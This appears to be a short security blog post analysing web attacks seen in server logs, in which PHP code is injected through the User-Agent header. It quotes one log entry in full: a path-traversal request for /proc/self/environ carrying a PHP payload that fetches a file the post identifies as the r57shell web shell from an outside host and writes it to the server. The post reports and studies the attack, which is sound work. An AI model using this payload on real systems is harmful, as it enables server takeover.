PHP in the user agent (attacking log analysis tools?)

Lately I started to see a few web-based attacks with a php script inside the user agent. Something like this:
a.b.229.82 – – [19/Jan/2010:22:43:39 -0700] “GET /index.php?page=../../../../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ HTTP/1.1″ 200 3820 “-” “< ? echo ‘_rce_’;echo php_uname();echo ‘_rce_’;$ch=curl_init();curl_setopt($ch, CURLOPT_URL, ‘http://websalesusa.com/ken’);curl_setopt($    ch, CURLOPT_CONNECTTIMEOUT, 15);curl_setopt($ch, CURLOPT_TIMEOUT, 15);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$cont=curl_exec($ch);curl_close($ch);$fh=fopen(‘doc.php’, ‘w’    );fwrite($fh, $cont);fclose($fh); ?> “
So, inside the user agent it is starting a PHP script that tries to download the file http://websalesusa.com/ken, which is the r57shell.php.
My guess is that it is trying to exploit a web stats or log analysis tool (like webalizer, google analytics, ossec, etc), but I couldn’t find which one is vulnerable to that. Any ideas?
**this is what the r57shell looks like: http://sucuri.net/?page=tools&title=blacklist&seeall=1&detail=eadbf8dc38276dba3df4d6db9608db74
